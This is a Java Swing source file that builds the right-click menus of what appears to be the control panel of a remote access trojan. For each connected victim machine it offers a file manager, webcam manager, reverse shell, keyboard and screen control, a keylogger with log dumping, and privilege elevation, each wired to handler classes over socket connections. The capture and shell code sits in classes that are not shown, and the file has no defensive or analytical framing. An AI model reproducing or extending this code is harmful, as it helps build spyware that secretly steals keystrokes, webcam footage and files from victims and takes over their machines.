package GUI.TableUtils.Configuration;

import Connections.Streams;
import GUI.JsGUI;
import GUI.Main;
import GUI.TableUtils.FileManager.Listener.FileManagerMenuListener;
import GUI.TableUtils.KeyLogger.KeyLoggerEventsListener;
import GUI.TableUtils.KeyLogger.KeyLoggerMenuListener;
import GUI.TableUtils.KeyLogger.KeyloggerEvents;
import GUI.TableUtils.KeyboardController.KeyboardControllerMenuListener;
import GUI.TableUtils.MessageBox.MessageBoxMenuListener;
import GUI.TableUtils.Permissions.CheckAdmin.AdminPermissionAction;
import GUI.TableUtils.Permissions.ElevatePermission.ElevatePermissionAction;
import GUI.TableUtils.ReverseShell.ReverseShellMenuListener;
import GUI.TableUtils.ReverseShell.ScreenMenuListener;
import GUI.TableUtils.Webcam.WebcamMenuListener;

import javax.swing.*;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.net.Socket;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

public class TablePopUpListener extends MouseAdapter {

    private final JsGUI mainGUI;

    public TablePopUpListener(JsGUI mainGUI) {
        this.mainGUI = mainGUI;
        createConnectedPopUpMenu();
        createDisconnectedPopUpMenu();
    }

    JPopupMenu disconnectedPopUpMenu = new JPopupMenu();

    private void createDisconnectedPopUpMenu() {
        JMenuItem removeRowItem = new JMenuItem("Remove row");
        JMenuItem updateItem = new JMenuItem("Refresh client");
        disconnectedPopUpMenu.add(removeRowItem);
        removeRowItem.addActionListener(e -> mainGUI.getConnectionsDefaultTableModel().removeRow(mainGUI.getConnectionsTable().getSelectedRow()));
        disconnectedPopUpMenu.add(updateItem);
        updateItem.addActionListener(e -> refreshClient()
        );
    }

    private void refreshClient(){
        int row = Main.gui.getConnectionsTable().getSelectedRow();
        String uniqueIP = (String) mainGUI.getConnectionsDefaultTableModel().getValueAt(row, 0);
        for (Map.Entry<Socket, Streams> entry : Main.server.getMap().entrySet())
            if ((uniqueIP).equals(entry.getKey().getInetAddress().toString())){
                mainGUI.getConnectionsDefaultTableModel().setValueAt("Connected",row,5);
            }
    }

    // Menus of table
    private JPopupMenu connectedPopUpMenu;

    private void createConnectedPopUpMenu() {
        connectedPopUpMenu = new JPopupMenu();
        JMenuItem fileManagerMenu = new JMenuItem("File manager");
        JMenuItem webcamMenu = new JMenuItem("Webcam manager");
        JMenuItem reverseShellMenu = new JMenuItem("Reverse shell");
        JMenuItem keyboardController = new JMenuItem("Keyboard controller");
        JMenuItem messageBoxMenu = new JMenuItem("Message box");
        JMenu keyloggerMenuOptions = new JMenu("Keylogger options");
        JMenuItem startKeyloggerMenu = new JMenuItem("Start");
        JMenuItem stopKeyloggerMenu = new JMenuItem("Stop");
        JMenuItem dumpLogsMenu = new JMenuItem("Dump last log");
        JMenuItem dumpAllLogsMenu = new JMenuItem("Dump all logs");
        keyloggerMenuOptions.add(startKeyloggerMenu);
        keyloggerMenuOptions.add(stopKeyloggerMenu);
        keyloggerMenuOptions.add(dumpLogsMenu);
        keyloggerMenuOptions.add(dumpAllLogsMenu);
        JMenu permissionsMenu = new JMenu("Admin privileges");
        JMenuItem isAdminMenu = new JMenuItem("Is admin");
        JMenuItem elevatePrivilegesMenu = new JMenuItem("Elevate privileges");
        permissionsMenu.add(isAdminMenu);
        permissionsMenu.add(elevatePrivilegesMenu);
        JMenuItem streamScreenMenu = new JMenuItem("Screen controller");
        // add to popup
        connectedPopUpMenu.add(fileManagerMenu);
        connectedPopUpMenu.add(webcamMenu);
        connectedPopUpMenu.add(reverseShellMenu);
        connectedPopUpMenu.add(keyboardController);
        connectedPopUpMenu.add(streamScreenMenu);
        connectedPopUpMenu.add(messageBoxMenu);
        connectedPopUpMenu.add(keyloggerMenuOptions);
        connectedPopUpMenu.add(permissionsMenu);


        JTable connectionsTable = mainGUI.getConnectionsTable();
        ConcurrentHashMap<Socket, Streams> mapOfConnections = mainGUI.getMap();
        // set actions
        webcamMenu.addActionListener(new WebcamMenuListener(connectionsTable, mapOfConnections, mainGUI));
        fileManagerMenu.addActionListener(new FileManagerMenuListener(connectionsTable, mapOfConnections, mainGUI));
        reverseShellMenu.addActionListener(new ReverseShellMenuListener(connectionsTable, mapOfConnections, mainGUI));
        keyloggerMenuOptions.addMenuListener(new KeyLoggerMenuListener(mapOfConnections,new JMenuItem[]{startKeyloggerMenu,stopKeyloggerMenu}));
        startKeyloggerMenu.addActionListener(new KeyLoggerEventsListener(connectionsTable, mapOfConnections, KeyloggerEvents.START));
        stopKeyloggerMenu.addActionListener(new KeyLoggerEventsListener(connectionsTable, mapOfConnections, KeyloggerEvents.STOP));
        dumpLogsMenu.addActionListener(new KeyLoggerEventsListener(connectionsTable, mapOfConnections, KeyloggerEvents.DUMP_LAST));
        dumpAllLogsMenu.addActionListener(new KeyLoggerEventsListener(connectionsTable, mapOfConnections, KeyloggerEvents.DUMP_ALL));
        keyboardController.addActionListener(new KeyboardControllerMenuListener(connectionsTable, mapOfConnections, mainGUI));
        isAdminMenu.addActionListener(new AdminPermissionAction(connectionsTable,mapOfConnections));
        elevatePrivilegesMenu.addActionListener(new ElevatePermissionAction(connectionsTable, mapOfConnections));
        messageBoxMenu.addActionListener(new MessageBoxMenuListener(connectionsTable, mapOfConnections));
        streamScreenMenu.addActionListener(new ScreenMenuListener(connectionsTable, mapOfConnections));
    }

    @Override
    public void mouseReleased(MouseEvent e) {
        if (e.isPopupTrigger()) {
            JTable source = (JTable) e.getSource();
            int row = source.rowAtPoint(e.getPoint());
            int column = source.columnAtPoint(e.getPoint());
            if (!source.isRowSelected(row)) source.changeSelection(row, column, false, false);
            if (mainGUI.getConnectionsDefaultTableModel().getValueAt(row, 5).equals("Connected")) {
                connectedPopUpMenu.show(e.getComponent(), e.getX(), e.getY());
            } else disconnectedPopUpMenu.show(e.getComponent(), e.getX(), e.getY());
        }
    }
}
